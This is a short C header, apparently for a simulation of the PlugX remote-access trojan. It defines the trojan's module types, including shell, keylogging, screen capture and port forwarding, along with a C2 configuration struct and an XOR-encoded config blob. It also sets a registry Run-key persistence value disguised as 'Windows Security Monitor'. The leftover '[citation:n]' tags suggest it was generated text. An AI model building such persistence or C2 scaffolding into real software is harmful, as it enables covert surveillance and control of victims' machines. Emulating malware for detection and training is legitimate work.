/**
 * plugx_config.h - PlugX Simulation Configuration
 */
#pragma once
#include <windows.h>

// PlugX module types [citation:5]
enum PlugXModule {
    MODULE_DISK = 0x1001,
    MODULE_SHELL = 0x1002,
    MODULE_KEYLOG = 0x1003,
    MODULE_SCREEN = 0x1004,
    MODULE_PORTFWD = 0x1005
};

// Configuration structure (encrypted in binary) [citation:9]
typedef struct {
    DWORD magic;           // 0x12345678 for Talisman variant
    DWORD c2Interval;      // Beacon interval in seconds
    DWORD c2Port;
    BYTE c2Server[64];     // Encrypted C2 address
    BYTE campaignId[16];   // Campaign identifier
} PLUGX_CONFIG;

// Default config (XOR-encrypted)
static const BYTE ENC_CONFIG[] = {
    0x4A, 0x8F, 0x2E, 0x91, 0x55, 0xC3, 0x7A, 0x1E,
    0xB2, 0x6D, 0x88, 0xF4, 0x19, 0xE7, 0x3C, 0xA5
};

// Registry persistence keys
#define PLUGX_REG_KEY L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define PLUGX_REG_VALUE L"Windows Security Monitor"